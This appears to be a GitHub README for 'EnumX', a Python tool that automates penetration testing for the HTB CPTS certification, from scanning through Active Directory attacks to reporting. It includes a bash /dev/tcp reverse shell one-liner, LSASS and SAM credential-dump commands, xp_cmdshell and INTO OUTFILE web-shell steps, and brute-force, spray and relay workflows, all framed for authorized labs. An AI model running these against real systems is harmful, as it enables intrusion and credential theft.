# EnumX – Full CPTS Automation Framework

```
███████╗███╗   ██╗██╗   ██╗███╗   ███╗██╗  ██╗
██╔════╝████╗  ██║██║   ██║████╗ ████║╚██╗██╔╝
█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝
██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗
███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗
╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
```

> ⚠️ **For authorized penetration testing and CTF/lab environments only (HTB, CPTS, etc.)**

A fully interactive, modular Python recon-to-report automation tool built for the **HTB CPTS certification** workflow. Every module is prompted individually — you stay in control of what runs.

---

## Table of Contents

- [Features](#features)
- [Requirements & Installation](#requirements--installation)
- [Quick Start](#quick-start)
- [Full Usage Guide](#full-usage-guide)
  - [CLI Arguments](#cli-arguments)
  - [Credentials File](#credentials-file)
  - [Nmap Scan](#1-nmap-scan)
  - [UDP Scan](#2-udp-scan)
  - [Machine Profiler](#3-machine-profiler)
  - [Extra Recon](#4-extra-recon)
  - [Web Attacks](#5-web-attacks)
  - [SMB Enumeration](#6-smb-enumeration)
  - [FTP Attacks](#7-ftp-attacks)
  - [SSH Attacks](#8-ssh-attacks)
  - [LDAP Enumeration](#9-ldap-enumeration)
  - [RDP Attacks](#10-rdp-attacks)
  - [SNMP Enumeration](#11-snmp-enumeration)
  - [Database Attacks](#12-database-attacks)
  - [Active Directory Attacks](#13-active-directory-attacks)
  - [Credential Attacks](#14-credential-attacks)
  - [Post-Exploitation – Linux](#15-post-exploitation--linux)
  - [Post-Exploitation – Windows](#16-post-exploitation--windows)
  - [Lateral Movement](#17-lateral-movement)
  - [Shell & Payload Generation](#18-shell--payload-generation)
  - [Searchsploit & Auto-Exploit](#19-searchsploit--auto-exploit)
  - [Reports & Output](#20-reports--output)
- [Common Scenarios](#common-scenarios)
- [SMB Access Matrix](#smb-access-matrix)
- [Output Structure](#output-structure)
- [Pro Tips](#pro-tips)
- [Disclaimer](#disclaimer)
- [Author](#author)

---

## Features

| Category | Tools / Techniques |
|---|---|
| **Recon** | Nmap (full/quick/custom/UDP + evasion), WAF detection, DNS, CRT.sh subdomains, VHOST brute |
| **Web** | whatweb, gobuster, feroxbuster, nikto, wfuzz, sqlmap, LFI probe, web shell test |
| **SMB** | Share discovery, credential × share access matrix, write test, enum4linux-ng, MS17-010 |
| **FTP** | Anonymous login, medusa, hydra brute |
| **SSH** | Banner enum, default creds, hydra brute |
| **LDAP** | Anonymous bind, naming context dump, full tree dump |
| **RDP** | Vuln check (MS12-020), ncrack/hydra brute |
| **SNMP** | Community string enum (snmpwalk) |
| **Databases** | MySQL, MSSQL (xp_cmdshell, xp_dirtree hash capture), PostgreSQL default creds |
| **Active Directory** | Kerbrute, AS-REP Roasting, Kerberoasting, BloodHound, password spray, PTH, DCSync, NTDS.dit |
| **Credentials** | hashcat, John, Responder + NTLM relay, CeWL wordlist generation |
| **Post-Linux** | linpeas auto-upload + critical findings parser, linux-exploit-suggester, checklist |
| **Post-Windows** | winpeas auto-upload, LSASS dump (pypykatz), SAM dump (secretsdump), checklist |
| **Lateral Movement** | evil-winrm, psexec, wmiexec, xfreerdp PTH |
| **Shells** | 6 reverse shell one-liners, msfvenom payloads (ELF/EXE/PHP/ASPX) |
| **Exploits** | searchsploit per service + auto-pull + auto-run matched exploits |
| **Reporting** | Markdown + HTML report, SMB access matrix table, HTB writeup skeleton, session log |

---

## Requirements & Installation

### Step 1 — Clone the repository

```bash
git clone https://github.com/ali5aled/EenumX.git
cd EenumX
```

### Step 2 — Make the script executable

```bash
chmod +x enumx_v4.py
```

### Step 3 — Install system dependencies

```bash
sudo apt update && sudo apt install -y \
  nmap smbclient enum4linux-ng netexec crackmapexec \
  hydra medusa ncrack gobuster feroxbuster nikto wfuzz sqlmap \
  snmp snmpwalk ldap-utils sshpass responder hashcat john \
  kerbrute impacket-scripts bloodhound whatweb wafw00f
```

### Step 4 — Install Python packages

```bash
pip3 install impacket pypykatz
```

### Step 5 — Verify the install

```bash
python3 enumx_v4.py --help
```

You should see the banner and the full help menu. If any tool is missing, EnumX will warn you at runtime and skip that module — it never crashes due to a missing tool.

> **Note:** All core tools are pre-installed on **Kali Linux** and **Parrot OS**. If you are on the HTB Pwnbox, you are already good to go — no installation needed.

---

## Quick Start

The fastest way to start on a new HTB/lab machine:

```bash
# Minimal — just a target IP
python3 enumx_v4.py --target 10.10.10.10

# With your tun0 IP for reverse shells
python3 enumx_v4.py --target 10.10.10.10 --lhost 10.10.14.5

# Full AD lab setup
python3 enumx_v4.py \
  --target 10.10.10.10 \
  --lhost 10.10.14.5 \
  --domain inlanefreight.local \
  --dc-ip 10.10.10.10 \
  --userlist users.txt \
  --passlist /usr/share/wordlists/rockyou.txt
```

When the tool starts it will:
1. Run nmap (you choose: full / quick / custom)
2. Display all open services
3. Auto-detect machine type and suggest an attack path
4. Prompt you **yes/no** for each module — you control everything

---

## Full Usage Guide

### CLI Arguments

| Flag | Required | Description |
|---|---|---|
| `--target` | ✅ Yes | Target IP address or hostname |
| `--lhost` | Recommended | Your VPN/tun0 IP — used for reverse shells and msfvenom payloads |
| `--domain` | AD labs | Active Directory domain (e.g. `inlanefreight.local`) |
| `--dc-ip` | AD labs | Domain Controller IP — used for Kerbrute, AS-REP, Kerberoast, BloodHound |
| `--creds` | Optional | Path to a `user:pass` credentials file (see format below) |
| `--userlist` | Optional | Default user list for brute force modules (hydra, kerbrute, spray) |
| `--passlist` | Optional | Default password list for brute force modules |
| `--skip-nmap` | Optional | Skip the nmap scan — useful when you already have results |
| `--nmap-xml` | With `--skip-nmap` | Path to an existing nmap XML file to use instead |
| `--no-color` | Optional | Disable ANSI color output (useful for logging to a file) |

---

### Credentials File

EnumX accepts a credentials file via `--creds`. Once loaded, those credentials are automatically reused across **every module** — SMB share testing, SSH login attempts, database attacks, WinRM, and AD attacks.

**Format** (`creds.txt`):
```
administrator:Password123!
svc-backup:Backup2024
john.doe:Welcome1
alice:Summer2024!
```

One `username:password` pair per line. Lines starting with `#` are ignored.

**How credentials flow through the tool:**
- SMB → tests every cred against every discovered share
- SSH → tries each cred via sshpass
- Databases → tests against MySQL/MSSQL/PostgreSQL
- AD → uses first cred for Kerberoasting, BloodHound, DCSync
- Lateral movement → uses first cred for evil-winrm, psexec, wmiexec

> **Tip:** You can start without a creds file and add found credentials interactively. The tool will prompt you to add new creds as you discover them during the session.

---

### 1. Nmap Scan

The first module that runs. You choose the scan type:

```
1) Full scan   -p-  (all 65535 ports) – thorough, slower
2) Quick scan  (top 1000 ports)       – fast start
3) Custom      (you specify ports)
```

- **Full scan** is recommended for CPTS — missing a service on an unusual port will cost you.
- **Quick scan** is good for a fast first look, then follow up with full.
- **Custom** lets you target specific ports like `22,80,443,8080,8443`.

After selecting the scan type, you'll be asked:
```
[?] Enable IDS/firewall evasion (decoys + fragmentation)? (y/n)
```
If yes, adds `-D RND:5 -f` to the nmap command to use random decoys and packet fragmentation.

All results are saved to:
- `nmap.xml` — parsed by EnumX for service detection
- `nmap.txt` — human-readable output

**Skip nmap** if you already ran it:
```bash
python3 enumx_v4.py --target 10.10.10.10 --skip-nmap --nmap-xml ./nmap.xml
```

---

### 2. UDP Scan

After the TCP scan completes, EnumX asks:
```
[?] Also run UDP scan? (top 20 ports, requires sudo) (y/n)
```

If yes, you choose how many top UDP ports to scan (default: 20). The scan runs `sudo nmap -sU --top-ports 20` and saves results to `udp.xml`. Discovered UDP services are automatically merged into the main service list, so the machine profiler and all modules see them.

Common UDP ports worth catching: DNS (53), SNMP (161/162), NTP (123), TFTP (69).

---

### 3. Machine Profiler

Immediately after nmap, EnumX analyzes the open ports and automatically identifies the machine type:

| Detected Pattern | Machine Type | Auto-Suggested Attack Path |
|---|---|---|
| Ports 88 + 389 + 445 | Windows Active Directory DC | Kerbrute → AS-REP → Kerberoast → BloodHound → DCSync |
| Port 1433 | Windows MSSQL Server | Default SA creds → xp_cmdshell → xp_dirtree hash capture |
| Ports 445 + 3389 | Windows Workstation/Server | SMB null session → cred spray → RDP brute → PTH |
| Port 445 only | Windows (SMB exposed) | Null session → enum4linux → EternalBlue check |
| Ports 80/443 + 22 | Linux Web Server | whatweb → gobuster → nikto → LFI/SQLi → web shell → linpeas |
| Port 21 | FTP Server | Anonymous login → download files → brute if anon fails |

It also flags unusual/high-value ports with specific hints:

```
⚡ Port 6379 → Redis → check unauth write (RCE via cron/authorized_keys)
⚡ Port 2375 → Docker API (unencrypted) → container escape / host RCE
⚡ Port 8888 → Jupyter Notebook → often no auth on HTB machines
⚡ Port 2049 → NFS → check showmount -e and mount without auth
```

This section gives you a clear starting point before diving into individual modules.

---

### 4. Extra Recon

```
[?] Extra recon (WAF/DNS/VHOST/CRT.sh)? (y/n)
```

If yes, you're prompted for each sub-task:

| Sub-task | Tool | What it does |
|---|---|---|
| WAF detection | `wafw00f` | Detects web application firewalls before attacking web |
| DNS records | `dig any` | Fetches all DNS records (A, MX, TXT, NS, SRV) |
| CRT.sh subdomain enum | `curl` + crt.sh API | Finds subdomains via certificate transparency logs |
| VHOST brute force | `gobuster vhost` | Discovers virtual hosts on the target web server |

Results saved to `recon/` subdirectory.

> **When to use:** Always run on web machines, especially if you see virtual hosting patterns or multiple domain names in the nmap output.

---

### 5. Web Attacks

Triggered automatically when HTTP/HTTPS ports are detected (80, 443, 8080, 8443, 8000, 8888).

```
[?] Web attacks on [80, 443]? (y/n)
```

For each web port, you're individually prompted for:

#### whatweb
```
[?] whatweb http://10.10.10.10? (y/n)
```
Fingerprints the web stack (CMS, framework, server version, plugins). Always run this first — it tells you what you're dealing with.

#### gobuster dir
```
[?] gobuster dir on http://10.10.10.10? (y/n)
Wordlist [/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt]:
Extensions [php,html,txt,js,json]:
```
Brute-forces directories and files. Customize the wordlist and extensions based on what whatweb found (e.g., use `.php` for PHP apps, `.aspx` for IIS).

#### feroxbuster
```
[?] feroxbuster recursive on http://10.10.10.10? (y/n)
```
Recursive directory brute-force — finds nested paths that gobuster misses.

#### nikto
```
[?] nikto on http://10.10.10.10? (y/n)
```
Web vulnerability scanner — checks for misconfigurations, outdated software, and common CVEs.

#### wfuzz parameter fuzzing
```
[?] wfuzz parameter fuzzing on http://10.10.10.10? (y/n)
URL with FUZZ placeholder [http://10.10.10.10/index.php?FUZZ=test]:
Hide response codes (comma-separated) [404,403]:
```
Fuzzes GET parameters to discover hidden inputs. Change the URL to point to the specific page you want to test.

#### sqlmap
```
[?] sqlmap SQLi on http://10.10.10.10? (y/n)
Full URL with param (e.g. http://host/page?id=1) [http://10.10.10.10]:
```
Automated SQL injection testing. Provide the full URL with the vulnerable parameter.

#### LFI probe
```
[?] LFI probe on http://10.10.10.10? (y/n)
Vulnerable parameter [file]:
```
Tests 6 common LFI payloads automatically. If `root:` or `bin:x` appears in the response, it's flagged as **CRITICAL**.

#### Web shell test
```
[?] Test web shell on http://10.10.10.10? (y/n)
Remote shell path if uploaded (or Enter to skip) []:
```
If you've already uploaded a web shell, provide the path (e.g., `uploads/shell.php`) and EnumX will test it by running `id`.

---

### 6. SMB Enumeration

Triggered when port 139 or 445 is detected.

```
[?] SMB attacks? (y/n)
```

EnumX runs a full SMB workflow automatically:

**Step 1 — Share Discovery**
Lists all shares via null session (`smbclient -N -L`) and with every credential from your creds file.

**Step 2 — Access Matrix**
Tests every credential (including anonymous) against every discovered share for READ and WRITE access. Write access is tested by uploading and deleting a temp file.

```
| Share    | anonymous | administrator | john   |
|----------|-----------|---------------|--------|
| ADMIN$   | -         | READ/WRITE    | -      |
| Finance  | -         | READ/WRITE    | READ   |
| IPC$     | READ      | READ/WRITE    | READ   |
```

**Step 3 — File Listings**
For every readable share × credential combination, saves the full directory listing to `smb/listing_<share>_<user>.txt`.

**Step 4 — Additional enum** (prompted individually):

```
[?] enum4linux-ng full RPC/user enum? (y/n)
[?] MS17-010 EternalBlue check? (y/n)
[?] netexec credential spray? (y/n)
```

> **WRITE access = CRITICAL** — flagged automatically. Write access to a share can be leveraged for SCF file attacks, DLL drop, or direct code execution.

---

### 7. FTP Attacks

Triggered when port 21 is detected.

```
[?] FTP attacks on [21]? (y/n)
```

| Prompt | What it does |
|---|---|
| Anonymous FTP login? | Tries `anonymous:anonymous@` and lists common dirs (/, /pub, /incoming, /upload) |
| hydra FTP brute? | Runs hydra with your user/pass lists against the FTP service |

If anonymous login works, the full directory listing is saved and flagged. All downloadable files should be reviewed manually.

---

### 8. SSH Attacks

Triggered when port 22 (or custom SSH port) is detected.

```
[?] SSH attacks on [22]? (y/n)
```

| Prompt | What it does |
|---|---|
| SSH banner enum via nmap? | Runs `ssh2-enum-algos` and `ssh-hostkey` scripts |
| Try default/known SSH creds? | Tests your creds file + 8 built-in defaults (root:root, admin:admin, ubuntu:ubuntu, etc.) via sshpass |
| hydra SSH brute? | Runs hydra with your user/pass lists |

If a valid SSH credential is found it's immediately added to the session creds and flagged **CRITICAL**.

> **Tip:** The default credential list includes `pi:raspberry`, `kali:kali`, `ubuntu:ubuntu` — common on misconfigured lab machines.

---

### 9. LDAP Enumeration

Triggered when ports 389, 636, 3268, or 3269 are detected.

```
[?] LDAP enumeration on [389]? (y/n)
```

| Prompt | What it does |
|---|---|
| LDAP anonymous bind? | Checks if anonymous bind is allowed and retrieves naming contexts |
| LDAP full anonymous dump? | Dumps the entire LDAP tree — requires you to provide the Base DN (e.g. `dc=inlanefreight,dc=local`) |

> **When to use:** Always run on AD machines. A misconfigured anonymous bind can reveal all AD users, groups, GPOs, and more without any credentials.

---

### 10. RDP Attacks

Triggered when port 3389 is detected.

```
[?] RDP attacks on [3389]? (y/n)
```

| Prompt | What it does |
|---|---|
| RDP vuln check (nmap)? | Checks for MS12-020 and enumerates RDP encryption settings |
| RDP brute (ncrack/hydra)? | Brute forces RDP with your user/pass lists (prefers ncrack if available) |

---

### 11. SNMP Enumeration

Triggered when ports 161 or 162 are detected.

```
[?] SNMP enumeration on [161]? (y/n)
```

Prompts for community string guessing. Default strings tested: `public`, `private`, `community`, `manager`, `secret`. You can add custom strings when prompted.

If a valid community string is found, `snmpwalk` dumps the full OID tree — this often reveals running processes, network interfaces, installed software, and user accounts.

#### Automatic Credential Extraction

After all snmpwalk tasks finish, EnumX automatically parses every output file for credentials leaked inside process argument strings (OID `hrSWRunParameters` — `.1.3.6.1.2.1.25.4.2.1.5`). This is a common and often overlooked entry point where services store credentials in their command-line flags.

**Example of what gets caught:**

```
iso.3.6.1.2.1.25.4.2.1.5.976  = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1144 = STRING: "-u daniel -p HotelBabylon23"
```

EnumX extracts and displays the credentials immediately:

```
[*] Credentials leaked in public_161.txt:
    username : daniel
    password : HotelBabylon23
```

The extracted credentials are:
- Printed in red to the terminal
- Added to the **live session cred manager** — automatically reused by every subsequent module (SMB, SSH, DB, AD, lateral movement)
- Added to the report as a **CRITICAL** finding at the top of `report.md` and `report.html`

**Credential patterns detected:**

| Pattern | Example |
|---|---|
| `-u USER -p PASS` | `-u daniel -p HotelBabylon23` |
| `-U USER -P PASS` | `-U admin -P secret123` |
| `--username USER --password PASS` | `--username john --password Welcome1` |
| `username=USER password=PASS` | `username=sa password=admin` |
| `user=USER pass=PASS` | `user=root pass=toor` |

If a line contains suspicious keywords (`passw`, `secret`, `token`, `apikey`) but doesn't match a known pattern, it's saved to `snmp/cred_hints_<community>_<port>.txt` and flagged **HIGH** for manual review.

---

### 12. Database Attacks

Triggered when ports 3306 (MySQL), 1433 (MSSQL), or 5432 (PostgreSQL) are detected.

```
[?] Database attacks? (y/n)
[?] Attack mysql port 3306? (y/n)
```

#### MySQL
- Tests default credentials: `root:` / `root:root` / `root:mysql` / `mysql:mysql` + your creds file
- Prompts: `MySQL INTO OUTFILE web shell?` — if the web root is known, writes a PHP web shell directly via SQL

#### MSSQL
- Tests `sa:` / `sa:sa` / `sa:password` / `sa:admin` + your creds file via netexec/crackmapexec
- Prompts:
  - `xp_cmdshell RCE?` — prints the exact SQL commands to enable and use xp_cmdshell
  - `Hash capture via xp_dirtree + Responder?` — prints the xp_dirtree command with your IP and reminds you to start Responder

#### PostgreSQL
- Tests `postgres:postgres` / `postgres:` / `admin:admin` + your creds file
- Lists all databases on success

---

### 13. Active Directory Attacks

Triggered when Kerberos (88), LDAP (389), or SMB (445) ports are detected together.

```
[?] Active Directory attacks? (y/n)
Domain (e.g. inlanefreight.local): inlanefreight.local
DC IP [10.10.10.10]: 10.10.10.10
```

> **Tip:** Pass `--domain` and `--dc-ip` on the command line to skip these prompts.

Full AD workflow — each step prompted individually:

| Step | Prompt | Tool | Notes |
|---|---|---|---|
| 1 | Kerbrute user enum? | `kerbrute` | Validates valid domain usernames without authentication |
| 2 | AS-REP Roasting? | `GetNPUsers.py` | Finds accounts with pre-auth disabled → crackable hashes |
| 3 | Kerberoasting? | `GetUserSPNs.py` | Extracts TGS tickets for service accounts → crack offline |
| 4 | BloodHound collection? | `bloodhound-python` | Maps the entire AD environment — requires valid creds |
| 5 | AD password spray? | `netexec` | Sprays one password across all users — careful of lockouts |
| 6 | Pass-the-Hash? | `netexec` | Uses an NT hash instead of a plaintext password |
| 7 | DCSync? | `secretsdump.py` | Dumps all AD hashes — requires DA or replication rights |
| 8 | NTDS.dit dump? | `netexec --ntds` | Extracts the full AD database |

After AS-REP Roasting and Kerberoasting, if hash files are found and non-empty:
```
[?] Crack AS-REP hashes with hashcat? (y/n)
Wordlist [/usr/share/wordlists/rockyou.txt]:
```
Hashcat runs automatically with the correct mode (`-m 18200` for AS-REP, `-m 13100` for TGS).

---

### 14. Credential Attacks

```
[?] Credential attacks (hashcat/john/Responder/CeWL)? (y/n)
```

| Prompt | Tool | Use case |
|---|---|---|
| CeWL custom wordlist? | `cewl` | Generates a wordlist from the target website — great for company-specific passwords |
| hashcat hash cracking? | `hashcat` | Crack hashes — prompts for hash file, mode, and wordlist |
| John the Ripper? | `john` | Alternative hash cracker — prompts for file, format, and wordlist |
| Start Responder? | `responder` | LLMNR/NBT-NS poisoning — captures NTLMv2 hashes on the network |
| NTLM relay? | `ntlmrelayx` | Relays captured hashes to a target for code execution |

**Common hashcat modes:**

| Mode | Hash Type |
|---|---|
| `0` | MD5 |
| `1000` | NTLM |
| `5600` | NetNTLMv2 (Responder captures) |
| `13100` | Kerberos TGS (Kerberoast) |
| `18200` | Kerberos AS-REP (AS-REP Roast) |
| `22100` | BitLocker |

---

### 15. Post-Exploitation – Linux

```
[?] Post-exploitation – Linux (linpeas/LES)? (y/n)
```

EnumX first prints the TTY upgrade commands as a reminder:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z → stty raw -echo → fg → export TERM=xterm-256color
```

It then generates a **privesc checklist script** at `post_linux/checklist.sh`:
```bash
# id_whoami
id && whoami && hostname

# sudo_l
sudo -l

# suid
find / -perm -4000 -type f 2>/dev/null

# writable
find / -writable -type d 2>/dev/null | grep -v proc

# password_hunt
grep -rn 'password\|passwd\|secret' /var/www /opt /home 2>/dev/null
# ... and more
```

#### linpeas auto-upload
```
[?] Auto-upload and run linpeas.sh on victim? (y/n)
Victim SSH user: john
Victim host/IP [10.10.10.10]:
Victim SSH port [22]:
```
EnumX:
1. Downloads the latest `linpeas.sh` from GitHub if not already present
2. SCP uploads it to `/tmp/linpeas.sh` on the victim
3. Runs it and streams output back
4. **Parses the output automatically** for critical findings (CVEs, NOPASSWD sudo, SUID binaries, passwords in files, writable sensitive files, Docker/LXD group membership)
5. Prints and reports any critical findings

#### linux-exploit-suggester
```
[?] Run linux-exploit-suggester on victim? (y/n)
```
Downloads, uploads, and runs `les.sh`. Highlights any **highly probable** kernel exploits.

---

### 16. Post-Exploitation – Windows

```
[?] Post-exploitation – Windows (winpeas/dump parsing)? (y/n)
```

Generates a **PowerShell checklist** at `post_windows/checklist.ps1`:
```powershell
# whoami_priv
whoami /all

# cred_hunt
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1

# lsass_dump
(Get-Process lsass).Id | ForEach-Object { rundll32 ... MiniDump $_ C:\lsass.dmp full }

# sam_dump
reg.exe save hklm\sam C:\sam.save; reg.exe save hklm\system C:\system.save
# ... and more
```

| Prompt | What it does |
|---|---|
| Auto-upload winpeas.exe? | Downloads winPEASx64.exe and gives you the exact SCP + SSH commands to run it |
| Parse LSASS dump (pypykatz)? | Provide a local `lsass.dmp` → extracts credentials with pypykatz |
| Parse SAM dump (secretsdump)? | Provide local `sam.save` + `system.save` → extracts NTLM hashes |

---

### 17. Lateral Movement

```
[?] Lateral movement? (y/n)
Target IP [10.10.10.10]:
```

EnumX checks which tools are installed and prompts for each:

| Prompt | Command printed | Use case |
|---|---|---|
| evil-winrm shell? | `evil-winrm -i <ip> -u <user> -p <pass>` | WinRM shell (port 5985/5986) |
| evil-winrm (PTH)? | `evil-winrm -i <ip> -u <user> -H <hash>` | Pass-the-Hash via WinRM |
| psexec shell? | `impacket-psexec <user>@<ip> [-hashes ...]` | Full SYSTEM shell via SMB |
| wmiexec? | `impacket-wmiexec <user>:<pass>@<ip>` | Semi-interactive shell via WMI |
| RDP PTH (xfreerdp)? | `xfreerdp /v:<ip> /u:<user> /pth:<hash>` | RDP session using NT hash |

EnumX automatically detects if you have an NT hash available and offers the PTH variant.

---

### 18. Shell & Payload Generation

```
Your IP for shell generation (Enter to skip): 10.10.14.5
[?] Listen port [4444]:
```

Generates and displays 6 ready-to-use reverse shell one-liners:

| Name | Shell |
|---|---|
| `bash_tcp` | `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'` |
| `bash_mkfifo` | mkfifo + nc reverse shell |
| `python3` | Python3 socket + pty.spawn |
| `php` | PHP fsockopen reverse shell |
| `powershell` | Full PowerShell TCP reverse shell |
| `nc_mkfifo` | mkfifo + bash + nc |

All shells saved to `shells/reverse_shells.txt`.

Then optionally generate msfvenom payloads:
```
[?] Generate msfvenom payloads? (y/n)
[?] Generate linux_x64_elf? (y/n)    → payload.elf
[?] Generate win_x64_exe? (y/n)      → payload.exe
[?] Generate php_shell? (y/n)        → payload.php
[?] Generate aspx_shell? (y/n)       → payload.aspx
```

EnumX also prints the listener command:
```
Start listener: rlwrap nc -lvnp 4444
```

---

### 19. Searchsploit & Auto-Exploit

```
[?] Searchsploit + auto-exploit on detected services? (y/n)
```

For each detected service (with product + version from nmap):
```
[?] Searchsploit 80/tcp Apache httpd 2.4.41? (y/n)
```

If matches are found, it extracts EDB IDs and prompts:
```
[*] Found 3 possible exploit(s): ['12345', '67890', '11111']
[?] Auto-pull exploit EDB-12345 and attempt? (review before running) (y/n)
```

If you confirm, EnumX:
1. Pulls the exploit with `searchsploit -m`
2. Shows you the file path to review it
3. Asks if you want to run it (Python/Bash/Ruby scripts only — unknown extensions are skipped for safety)

> **Always review the exploit before running it** — EnumX will show you the path.

---

### 20. Reports & Output

At the end of the session, EnumX saves three files automatically:

#### `report.md`
Full markdown report including:
- All discovered credentials (top of the report)
- Findings table sorted by severity (CRITICAL → HIGH → MEDIUM → INFO)
- All module output sections
- SMB access matrix

#### `report.html`
Dark-themed, color-coded HTML version of the report. Open in a browser for easy reading:
```bash
firefox enumx_out/10.10.10.10/20250419-143022/report.html
```

Severity colors:
- 🔴 **CRITICAL** — credentials found, write access, RCE confirmed
- 🟠 **HIGH** — potential vulnerabilities, hash capture, spray results
- 🟡 **MEDIUM** — findings worth investigating
- 🔵 **INFO** — general enumeration results

#### `writeup_skeleton.md`
Auto-generated HTB-style writeup template pre-filled with:
- Your discovered services
- High/critical findings
- Screenshot placeholders (`[screenshot: initial_access.png]`)
- Flags table
- Key takeaways section

#### `session_log.txt`
Every single command run during the session with its timestamp, return code, and first 800 characters of output. Useful for reproducing steps or writing your report later.

---

## Common Scenarios

### Linux Web Machine

```bash
python3 enumx_v4.py --target 10.10.10.10 --lhost 10.10.14.5
```

Recommended flow:
1. Quick nmap scan → see ports 22 and 80/443
2. Machine profiler suggests: Linux Web Server path
3. Run web attacks → whatweb → gobuster → nikto → LFI probe
4. If SQLi found → sqlmap
5. If shell uploaded → web shell test
6. Post-exploit Linux → linpeas auto-upload → review critical findings
7. Privesc based on linpeas results

---

### Windows Active Directory

```bash
python3 enumx_v4.py \
  --target 10.10.10.175 \
  --lhost 10.10.14.5 \
  --domain inlanefreight.local \
  --dc-ip 10.10.10.175
```

Recommended flow:
1. Full nmap → detect 88 + 389 + 445 → Machine profiler: Windows AD DC
2. SMB null session → check shares and user enum
3. LDAP anonymous bind → dump naming contexts
4. AD attacks → Kerbrute → AS-REP Roast → crack hashes → spray
5. Once creds found: add to `--creds`, restart or continue to Kerberoast → BloodHound
6. Lateral movement → evil-winrm / psexec
7. Post-exploit Windows → SAM/LSASS dump → DCSync

---

### Windows MSSQL Box

```bash
python3 enumx_v4.py --target 10.10.10.125 --lhost 10.10.14.5
```

Recommended flow:
1. Nmap detects port 1433 → Machine profiler: MSSQL Server
2. Database attacks → test SA with empty password
3. If SA access: enable xp_cmdshell → RCE
4. xp_dirtree + Responder → capture NTLMv2 hash → hashcat
5. Lateral movement with cracked creds

---

### FTP / SMB Anonymous

```bash
python3 enumx_v4.py --target 10.10.10.130 --lhost 10.10.14.5
```

Recommended flow:
1. Quick nmap → detect ports 21, 445
2. FTP anonymous → download all files → look for creds/configs
3. SMB null session → list shares → access Finance/Data shares
4. Search downloaded files for credentials → add to creds file
5. Re-run with `--creds creds.txt` for authenticated enumeration

---

### Skipping Nmap (Already Scanned)

```bash
python3 enumx_v4.py \
  --target 10.10.10.10 \
  --skip-nmap \
  --nmap-xml /path/to/scan.xml \
  --lhost 10.10.14.5
```

---

## SMB Access Matrix

After SMB enumeration, EnumX builds a full access matrix showing which user has access to which share:

```
| Share    | anonymous | administrator | john   | alice  |
|----------|-----------|---------------|--------|--------|
| ADMIN$   | -         | READ/WRITE    | -      | -      |
| C$       | -         | READ/WRITE    | -      | -      |
| IPC$     | READ      | READ/WRITE    | READ   | READ   |
| Users    | -         | READ/WRITE    | READ   | READ   |
| Finance  | -         | READ/WRITE    | -      | READ/WRITE |
```

Write access is automatically tested and flagged as **CRITICAL** (potential RCE via SCF/DLL drop).
File listings for each accessible share are saved to `smb/listing_<share>_<user>.txt`.

---

## Output Structure

```
enumx_out/
└── 10.10.10.10/
    └── 20250419-143022/
        ├── nmap.xml / nmap.txt          # TCP scan results
        ├── udp.xml  / udp.txt           # UDP scan results (if run)
        ├── session_log.txt              # every command + timestamp + output
        ├── report.md                    # full markdown report
        ├── report.html                  # styled HTML report
        ├── writeup_skeleton.md          # HTB-style writeup template
        ├── recon/                       # WAF, DNS, CRT.sh, VHOST results
        ├── web/                         # gobuster, nikto, sqlmap, LFI, wfuzz
        ├── smb/                         # shares, access matrix, file listings
        ├── ftp/                         # anonymous login, brute results
        ├── ssh/                         # banner, cred test, hydra results
        ├── ldap/                        # naming contexts, full dump
        ├── rdp/                         # vuln check, brute results
        ├── snmp/                        # community string results
        ├── db/                          # mysql/mssql/postgresql results
        ├── ad/                          # kerbrute, asrep, kerberoast, bloodhound, dcsync
        ├── creds/                       # hashcat, john, responder, cewl
        ├── post_linux/                  # linpeas, les, checklist.sh
        ├── post_windows/                # winpeas, pypykatz, secretsdump, checklist.ps1
        ├── lateral/                     # lateral movement command notes
        ├── shells/                      # reverse shells, msfvenom payloads
        └── searchsploit/                # per-service exploit results
```

---

## Pro Tips

**1. Answer `n` to skip modules you don't need**
EnumX is fully interactive — you never have to run something you don't want. Say no to anything irrelevant to the current target.

**2. Use `--skip-nmap` to save time on repeat runs**
If you already scanned, pass the existing XML. Nmap on `-p-` can take 10+ minutes — no need to redo it.

**3. Start with Quick scan, follow up with Full**
Do a quick scan first to start attacking immediately, then run a full `-p-` scan in another terminal to catch services on unusual ports.

**4. Build your creds file as you go**
Start without `--creds`. When you find a password (web app, FTP, file on SMB share), add it to `creds.txt` and pass it to the next module manually or restart with `--creds creds.txt`.

**5. Always run the Machine Profiler's suggested path first**
The profiler gives you a prioritized attack path based on what's actually open. Follow it before going off-script.

**6. Use `--no-color` when logging to a file**
```bash
python3 enumx_v4.py --target 10.10.10.10 --no-color 2>&1 | tee session.txt
```

**7. Check `session_log.txt` for your report**
Every command with its full output is logged. When writing your writeup, this is your complete command history.

**8. LFI probe tests 6 payloads automatically**
If even one returns `root:` in the response, it's flagged CRITICAL and logged. No need to manually test each path.

**9. For AD — always run BloodHound**
BloodHound's attack path visualization can save hours. Even if you already have admin, it'll show you what you could have found faster.

**10. UDP scan catches what TCP misses**
SNMP on 161 is UDP-only. Many CPTS machines expose SNMP — run the UDP scan, especially on Windows targets.

---

## Disclaimer

This tool is intended **only** for:
- Authorized penetration testing engagements
- CTF competitions (HackTheBox, TryHackMe, etc.)
- Security certification labs (CPTS, OSCP, etc.)
- Educational and research purposes

**Do not use against systems you do not have explicit written permission to test.**

---

## Author

**0xZoro** – CPTS student | HTB enthusiast
Notes & Cheatsheet: [0xzoro.gitbook.io](https://0xzoro.gitbook.io/0xzoro/cpts/cpts-cheat-sheet)
